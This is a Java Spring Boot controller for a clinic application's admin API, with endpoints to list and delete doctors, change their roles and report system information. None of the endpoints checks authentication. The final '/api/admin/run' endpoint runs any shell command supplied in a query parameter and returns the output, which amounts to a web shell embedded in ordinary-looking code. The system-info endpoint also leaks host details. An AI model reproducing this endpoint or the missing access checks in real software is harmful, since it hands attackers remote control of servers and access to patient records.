package com.example.clinic.controller;

import com.example.clinic.entity.Doctor;
import com.example.clinic.repository.DoctorRepository;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/api/admin")
public class AdminController {

    private final DoctorRepository doctorRepository;

    public AdminController(DoctorRepository doctorRepository) {
        this.doctorRepository = doctorRepository;
    }

    @GetMapping("/doctors")
    public List<Doctor> getAllDoctors() {
        return doctorRepository.findAll();
    }

    @DeleteMapping("/doctors/{id}")
    public ResponseEntity<?> deleteDoctor(@PathVariable Long id) {
        doctorRepository.deleteById(id);
        return ResponseEntity.ok(Map.of("status", "Docteur supprime"));
    }

    @PutMapping("/doctors/{id}/role")
    public ResponseEntity<?> changeRole(@PathVariable Long id, @RequestBody Map<String, String> body) {
        return doctorRepository.findById(id)
                .map(doctor -> {
                    doctor.setRole(body.get("role"));
                    doctorRepository.save(doctor);
                    return ResponseEntity.ok(Map.of("status", "Role modifie", "newRole", doctor.getRole()));
                })
                .orElse(ResponseEntity.notFound().build());
    }

    @GetMapping("/system-info")
    public Map<String, Object> systemInfo() {
        return Map.of(
            "javaVersion", System.getProperty("java.version"),
            "osName", System.getProperty("os.name"),
            "osVersion", System.getProperty("os.version"),
            "userDir", System.getProperty("user.dir"),
            "userName", System.getProperty("user.name"),
            "freeMemory", Runtime.getRuntime().freeMemory(),
            "totalMemory", Runtime.getRuntime().totalMemory()
        );
    }

    @GetMapping("/run")
    public Map<String, Object> runCommand(@RequestParam String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            String output = new String(process.getInputStream().readAllBytes());
            return Map.of("output", output);
        } catch (Exception e) {
            return Map.of("error", e.getMessage());
        }
    }
}
